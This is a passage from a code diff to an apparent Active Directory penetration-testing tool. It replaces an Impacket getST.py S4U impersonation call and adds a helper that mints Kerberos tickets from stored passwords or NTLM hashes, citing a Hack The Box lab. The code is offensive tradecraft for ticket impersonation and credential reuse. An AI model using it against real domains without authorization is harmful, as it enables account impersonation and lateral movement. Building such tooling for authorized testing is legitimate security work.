+            f"{target_user}@{service}_{pdc_hostname}.{domain}@{domain.upper()}.ccache"
+        )
+        ccache_path = Path.cwd() / ccache_filename
 
-        command_list: list[str] = []
-
-        if not get_st_path.exists() or not os.access(get_st_path, os.X_OK):
-            msg = (
-                f"getST.py not found or not executable in {impacket_scripts_dir}. "
-                "Please check Impacket installation."
-            )
-            self.logger.warning(msg)
-            return KerberosServiceTicketResult(
-                target_user=target_user,
-                spn=spn,
-                success=False,
-                error_message=msg,
-                command=None,
-            )
-
-        env = get_clean_env_for_compilation()
-        # Preserve Kerberos-related variables such as KRB5CCNAME / KRB5_CONFIG.
-
-        command_list = [
-            str(get_st_path),
-            "-spn",
-            spn,
-            "-impersonate",
-            target_user,
-            "-dc-ip",
-            pdc_ip,
-            f"{domain}/{s4u_account}:{s4u_password}",
-        ]
-        command_str = shlex.join(command_list)
-
-        self.logger.info(
-            "Creating forwardable ticket via getST.py",
-            extra={"target_user": target_user, "spn": spn},
+        _render_s4u_preflight(
+            domain=domain,
+            kdc_ip=pdc_ip,
+            s4u_account=s4u_account,
+            target_user=target_user,
+            spn=spn,
+            ccache_path=str(ccache_path),
         )
 
         try:
-            completed = self._run_command_logged(
-                label="getST.py",
-                command=command_list,
-                timeout=timeout,
-                env=env,
-                shell=False,
+            return run_async_sync(
+                _s4u_forwardable_ticket_async(
+                    domain=domain,
+                    pdc_ip=pdc_ip,
+                    s4u_account=s4u_account,
+                    s4u_password=s4u_password,
+                    target_user=target_user,
+                    spn=spn,
+                    ccache_path=ccache_path,
+                )
             )
-        except subprocess.TimeoutExpired as exc:
-            msg = f"getST.py timed out after {timeout} seconds: {exc}"
-            self.logger.warning(msg)
-            return KerberosServiceTicketResult(
-                target_user=target_user,
-                spn=spn,
-                success=False,
-                error_message=msg,
-                command=command_str,
-            )
-        except Exception as exc:  # pragma: no cover - defensive
-            msg = f"Unexpected error running getST.py: {exc}"
-            self.logger.exception(msg, exc_info=True)
-            return KerberosServiceTicketResult(
-                target_user=target_user,
-                spn=spn,
-                success=False,
-                error_message=msg,
-                command=command_str,
-            )
+        except Exception as exc:
+            from adscan_internal import telemetry as _tel  # noqa: PLC0415
 
-        if completed.returncode != 0:
-            stderr = (completed.stderr or "").strip()
-            msg = (
-                stderr or f"getST.py exited with non-zero status {completed.returncode}"
-            )
-            self.logger.warning(
-                "getST.py failed for forwardable ticket",
-                extra={
-                    "returncode": completed.returncode,
-                    "stdout": completed.stdout,
-                    "stderr": completed.stderr,
-                },
-            )
+            _tel.capture_exception(exc)
+            msg = _classify_s4u_error(str(exc))
+            print_error(f"S4U forwardable ticket failed: {msg}")
             return KerberosServiceTicketResult(
-                target_user=target_user,
-                spn=spn,
-                success=False,
-                error_message=msg,
-                command=command_str,
+                target_user=target_user, spn=spn, success=False, error_message=msg
             )
-
-        output_text = f"{completed.stdout or ''}\n{completed.stderr or ''}".strip()
-        ticket_match = re.search(r"Saving ticket in (\S+)", output_text)
-        ticket_path = ticket_match.group(1) if ticket_match else None
-        lowered_output = output_text.lower()
-        if (
-            "kdc_err_" in lowered_output
-            or "kerberos sessionerror" in lowered_output
-            or "doesn't exist" in lowered_output
-            or not ticket_path
-        ):
-            msg = output_text or "getST.py did not report a saved ticket path"
-            self.logger.warning(
-                "getST.py returned an unusable result for %s@%s: %s",
-                target_user,
-                spn,
-                msg,
-            )
-            return KerberosServiceTicketResult(
-                target_user=target_user,
-                spn=spn,
-                success=False,
-                error_message=msg,
-                command=command_str,
-                ticket_path=ticket_path,
-            )
-
-        self.logger.info(
-            "Forwardable ticket created successfully via getST.py",
-            extra={"target_user": target_user, "spn": spn},
-        )
-        return KerberosServiceTicketResult(
-            target_user=target_user,
-            spn=spn,
-            success=True,
-            command=command_str,
-            ticket_path=ticket_path,
-        )
 
     def sync_clock_with_pdc(
         self,
@@ -1807,8 +1907,190 @@ class KerberosTicketService(BaseService):
             return False
 
 
+def ensure_user_ccache(
+    shell: Any,
+    *,
+    user: str,
+    domain: str,
+    credential: Optional[str] = None,
+    dc_ip: Optional[str] = None,
+    force_refresh: bool = False,
+) -> Optional[str]:
+    """Return path to a valid Kerberos ccache for ``user@domain``.
+
+    This is the **single source of truth** every caller in the codebase
+    should use when they need to authenticate as a specific principal
+    via Kerberos. It replaces the historical pattern of passing
+    ``username + password + kerberos=True`` and trusting that the LDAP
+    transport will do the right thing — that pattern was the root cause
+    of the 2026-05-21 ``KRB5CCNAME`` hijack on HTB Puppy (a follow-up
+    ``enable_user`` ran with explicit ant.edwards credentials but the
+    LDAP transport silently used LEVI.JAMES's ccache from the env var,
+    rejecting the modify because LEVI.JAMES lacked GenericAll).
+
+    Flow:
+
+    1. Look up the canonical path
+       ``<workspace>/domains/<domain>/kerberos/tickets/<user>.ccache``.
+    2. If the file exists AND ``is_ticket_valid`` confirms it is usable,
+       return the path (fast path — no AS-REQ).
+    3. Otherwise mint a fresh TGT via :meth:`KerberosTicketService.auto_generate_tgt`
+       using the supplied ``credential`` (or the one stored in the
+       shell's credential registry under ``(domain, user)``), save it to
+       the canonical path, and return the path.
+    4. Update ``shell.domains_data[domain]["kerberos_tickets"][user]`` so
+       subsequent callers find the path through the legacy registry too.
+
+    Args:
+        shell: PentestShell instance with ``workspace_dir``,
+            ``domains_data`` and (optionally) a credential registry. Any
+            object exposing these attributes works for tests.
+        user: sAMAccountName of the principal to authenticate as.
+        domain: Active Directory domain name.
+        credential: Password or NTLM hash. If ``None``, the function
+            looks up the credential in the shell's stored credentials.
+            Pass explicitly when the caller already has the cleartext
+            (e.g. immediately after spraying validates a password).
+        dc_ip: Optional DC IP for the AS-REQ. Falls back to
+            ``shell.domains_data[domain]["pdc"]`` when omitted.
+        force_refresh: When ``True``, ignore any existing ccache and
+            always mint a fresh TGT. Use after privilege-granting
+            operations (AddMember, ForceChangePassword) so the next
+            bind sees the updated PAC.
+
+    Returns:
+        Path to a valid ccache, or ``None`` when minting failed and
+        no usable cache exists. Callers must check for ``None`` and
+        decide whether to fall back to password-based auth or surface
+        an error to the operator.
+
+    Notes:
+        Idempotent and safe to call from any flow. The fast path is
+        a single ``klist -s -c`` invocation when the cache exists and
+        is valid — typically under 50ms.
+    """
+    user = (user or "").strip()
+    domain = (domain or "").strip()
+    if not user or not domain:
+        print_info_debug(
+            "[kerberos-auth] ensure_user_ccache: missing user or domain; "
+            f"user={user!r} domain={domain!r}. Cannot mint TGT."
+        )
+        return None
+
+    # The canonical attribute on ``PentestShell`` is ``current_workspace_dir``
+    # — the other names are legacy aliases that some test shells / older
+    # entry points still expose. Probe all of them so the helper works
+    # uniformly across the shell variants in the codebase. A missing
+    # attribute is no longer a silent return: we log it so the next
+    # operator knows their shell didn't carry the workspace into the
+    # Kerberos call.
+    workspace_dir = str(
+        getattr(shell, "current_workspace_dir", None)
+        or getattr(shell, "workspace_dir", None)
+        or getattr(shell, "workspace_path", None)
+        or ""
+    ).strip()
+    if not workspace_dir:
+        print_info_debug(
+            "[kerberos-auth] ensure_user_ccache: shell exposes no "
+            "current_workspace_dir/workspace_dir/workspace_path; cannot "
+            f"locate the kerberos/tickets folder. user={mark_sensitive(user, 'user')} "
+            f"domain={mark_sensitive(domain, 'domain')} shell_type={type(shell).__name__!r}"
+        )
+        return None
+
+    domains_data = getattr(shell, "domains_data", None) or {}
+    service = KerberosTicketService()
+
+    if not force_refresh:
+        cached_path = service.get_ticket_for_user(
+            workspace_dir=workspace_dir,
+            domain=domain,
+            username=user,
+            domains_data=domains_data,
+        )
+        if cached_path and service.is_ticket_valid(ticket_path=cached_path):
+            return cached_path
+
+    # Resolve the credential. Caller-supplied value wins; fall back to
+    # the shell's credential store. We intentionally do not expose the
+    # credential in any log line — only its presence/absence.
+    resolved_credential = (credential or "").strip()
+    if not resolved_credential:
+        domain_record = (
+            domains_data.get(domain, {}) if isinstance(domains_data, dict) else {}
+        )
+        stored = domain_record.get("credentials", {}) if isinstance(
+            domain_record, dict
+        ) else {}
+        if isinstance(stored, dict):
+            entry = stored.get(user) or stored.get(user.lower()) or stored.get(
+                user.upper()
+            )
+            if isinstance(entry, str):
+                resolved_credential = entry.strip()
+            elif isinstance(entry, dict):
+                resolved_credential = str(
+                    entry.get("password") or entry.get("hash") or ""
+                ).strip()
+
+    if not resolved_credential:
+        print_info_debug(
+            "[kerberos-auth] ensure_user_ccache: no credential available for "
+            f"user={mark_sensitive(user, 'user')} "
+            f"domain={mark_sensitive(domain, 'domain')}; cannot mint TGT."
+        )
+        return None
+
+    # Resolve the DC IP for the AS-REQ.
+    if not dc_ip:
+        domain_record = (
+            domains_data.get(domain, {}) if isinstance(domains_data, dict) else {}
+        )
+        if isinstance(domain_record, dict):
+            dc_ip = (
+                domain_record.get("pdc")
+                or (
+                    domain_record.get("dcs")[0]
+                    if isinstance(domain_record.get("dcs"), list)
+                    and domain_record["dcs"]
+                    else None
+                )
+            )
+
+    result = service.auto_generate_tgt(
+        username=user,
+        credential=resolved_credential,
+        domain=domain,
+        workspace_dir=workspace_dir,
+        dc_ip=dc_ip,
+    )
+
+    if not result.success or not result.ticket_path:
+        print_info_debug(
+            "[kerberos-auth] ensure_user_ccache: TGT mint failed for "
+            f"user={mark_sensitive(user, 'user')} "
+            f"domain={mark_sensitive(domain, 'domain')} "
+            f"error={result.error_message!r}"
+        )
+        return None
+
+    # Update the legacy registry so other code paths that consult
+    # ``domains_data[domain]["kerberos_tickets"]`` see the fresh ticket.
+    if isinstance(domains_data, dict):
+        domain_record = domains_data.setdefault(domain, {})
+        if isinstance(domain_record, dict):
+            tickets = domain_record.setdefault("kerberos_tickets", {})
+            if isinstance(tickets, dict):
+                tickets[user] = result.ticket_path
+
+    return result.ticket_path
+
+
 __all__ = [
     "KerberosTicketService",
     "KerberosTGTResult",
     "KerberosServiceTicketResult",
+    "ensure_user_ccache",
 ]
